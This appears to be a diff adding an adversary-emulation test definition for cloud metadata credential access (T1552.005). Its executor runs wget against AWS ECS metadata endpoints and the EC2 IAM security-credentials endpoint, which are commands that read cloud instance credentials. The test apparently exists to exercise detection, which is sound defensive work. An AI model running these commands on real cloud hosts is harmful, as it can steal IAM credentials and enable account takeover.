@@ -1,0 +1,24 @@
+attack_technique: T1552.005
+display_name: reconnaisance of AWS ECS metadata endpoints
+atomic_tests:
+- name: Test
+  description: Test
+  dependencies:
+  - description: |
+      Checks for wget
+    prereq_command: |
+      which wget
+    get_prereq_command: |
+      echo 'This test requires wget'
+  supported_platforms:
+    - linux
+    - containers
+  executor:
+    command: |
+      wget ${ECS_CONTAINER_METADATA_URI_V4}
+      wget ${ECS_CONTAINER_METADATA_URI}
+      wget 169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
+      wget http://169.254.169.254/latest/meta-data/iam/security-credentials  
+      
+    name: bash
+    elevation_required: false
